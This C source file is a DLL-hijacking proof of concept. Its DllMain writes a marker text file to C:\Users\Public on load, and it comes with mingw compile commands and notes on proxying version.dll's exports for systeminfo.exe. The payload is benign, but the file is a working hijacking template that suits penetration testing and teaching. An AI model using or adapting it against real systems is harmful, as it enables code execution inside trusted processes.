/*
Name        : create-file.c
Description : DLL Hijacking PoC that creates a file.
Compile 64  : x86_64-w64-mingw32-gcc -shared -o create-file.dll create-file.c
Compile 32  : i686-w64-mingw32-gcc -shared -o create-file.dll create-file.c
Author      : Lisandre.com
Date        : 2025-05-02
Prereq      : Run sigcheck from Sysinternals to know if the app is 32-bit or 64-bit
              sigcheck.exe VulnerableApp.exe
*/
#include <windows.h>
#include <stdio.h>

// DLL Entry Point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        FILE* f = fopen("C:\\Users\\Public\\dllhijack.txt", "w");
        if (f != NULL) {
            fprintf(f, ">>> DLL Hijacking: It works!\n");
            fclose(f);
        }
    }
    return TRUE;
}

// Add stub functions here to prevent entry point errors, see export-dll-functions-stubs.py

/*
Example: C:\Windows\System32\systeminfo.exe (64-bit), version.dll
python3 export-dll-functions-stubs.py version.dll > version-stubs.txt
# modify the function stubs as needed
cat create-file.c version-stubs.txt > version.c
x86_64-w64-mingw32-gcc -shared -o version.dll version.c -lws2_32 -fPIC
*/
